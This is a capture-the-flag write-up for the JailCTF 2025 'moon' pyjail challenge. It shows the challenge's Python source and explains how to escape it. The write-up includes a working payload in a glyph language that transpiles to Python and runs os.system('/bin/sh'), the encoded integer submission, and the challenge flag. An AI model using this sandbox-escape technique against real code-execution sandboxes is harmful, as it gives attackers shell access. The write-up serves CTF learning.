---
layout: writeup
parent: JailCTF 2025
tags: ["moon", "pyjail"]
---
<h1>{{ page.title | downcase }} {% for tag in page.tags %}<span class="category-tag">{{ tag }}</span>{% endfor %}</h1>
```
glyph-based language that transpiles to python (for now…)
```
main.py:
```python
#!/usr/local/bin/python3
import os
import tempfile

inp = [int(n_str) for n_str in input('moon input > ').split()]

if not all(n > 255 for n in inp):
    print('bad input')
    exit()

with tempfile.NamedTemporaryFile(mode='w', suffix='.☾', delete_on_close=False) as f:
    f.write('print("loaded");' + ''.join([chr(n) for n in inp]))
    f.close()
    print('loading')
    os.system(f'☾ {f.name}')
    print('done')
```

## ☾?
The core of this challenge was finding a payload that entirely consisted of ASCII characters codes > 255.

## Method
Since ☾ transpiles to Python, we can pretty much use anything in Python in ☾. Using this, the core of the exploit is running `__import__('os').system('/bin/sh')` in a fancy way:

1. We need a way to execute code ourselves which by looking into the [moon docs](https://moon-docs.netlify.app/) we are given 󱠨 which can exec ☾ code at runtime (pretty much Python's `exec()`)
2. To encode the string, we can first use 󷸓 to subscript our Python payload and in our ☾ payload use 󷸼 to unscript it.
3. We can then use magic strings (which are pretty much equivalent to format strings in Python) to formulate our final payload

One final thing to note is that to call functions without parentheses (which are not allowed) we can use ∘ which calls the function with one argument

## Payload

### in ☾
󱠨∘‹⟦󷸼∘‹􋕞􋕞ᵢₘₚ󰂼ᵣₜ􋕞􋕞₍􋕦󰂼ₛ􋕦₎􋕜ₛₛₜₑₘ₍􋕦􋑫ᵢₙ􋑫ₛₕ􋕦₎›⟧›

### challenge submission (integer ascii codes)
![da moooon](/files/overdamoon.png)
```
989224 8728 8249 10214 1015356 8728 8249 1095006 1095006 7522 8344 8346 983228 7523 8348 1095006 1095006 8333 1095014 983228 8347 1095014 8334 1095004 8347 59411 8347 8348 8337 8344 8333 1095014 1094763 59397 7522 8345 1094763 8347 8341 1095014 8334 8250 10215 8250
```

`jail{welcome_to_spaghetti_code_convention_2025_57287fc685d9894e1}`



